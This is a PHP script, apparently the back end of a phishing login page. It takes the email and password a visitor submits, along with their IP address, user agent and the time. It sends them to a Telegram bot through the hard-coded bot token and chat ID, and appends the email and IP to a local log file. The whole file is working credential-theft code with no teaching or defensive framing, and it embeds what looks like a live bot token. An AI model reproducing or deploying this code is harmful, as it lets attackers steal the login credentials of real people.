<?php

$botToken = "7549318619:AAEJt9ORHDKvAYn7q0DjWjVyACIqcOHj09M";
$chatId = "6909133692";

/* SYSTEM INFO */
$ip        = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$page      = $_SERVER['REQUEST_URI'] ?? 'unknown';
$time      = date("Y-m-d H:i:s");

$isLogin = ($_SERVER['REQUEST_METHOD'] === 'POST'
            && !empty($_POST['email'])
            && !empty($_POST['password']));

/* FORM DATA */
$email = 'N/A';
$password = 'N/A';

if ($isLogin) {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
}
/* BUILD MESSAGE (NO MIXED HTML HERE) */
$message =
"ðŸš€ WEBSITE ACTIVITY REPORT\n" .
"============================\n" .
"Email: $email\n" .
"Password: $password\n\n" .
"IP: $ip\n" .
"Page: $page\n" .
"Time: $time\n" .
"User-Agent: $userAgent\n";

/* SEND TO TELEGRAM */
if ($isLogin) {
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$data = [
    "chat_id" => $chatId,
    "text" => $message
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_exec($ch);
curl_close($ch);
}

/* LOG FILE */
$log =
"--- EVENT ---\n" .
"Time: $time\n" .
"Email: $email\n" .
"IP: $ip\n\n";

if ($isLogin) {
    file_put_contents("log.txt", $log, FILE_APPEND);
}

?>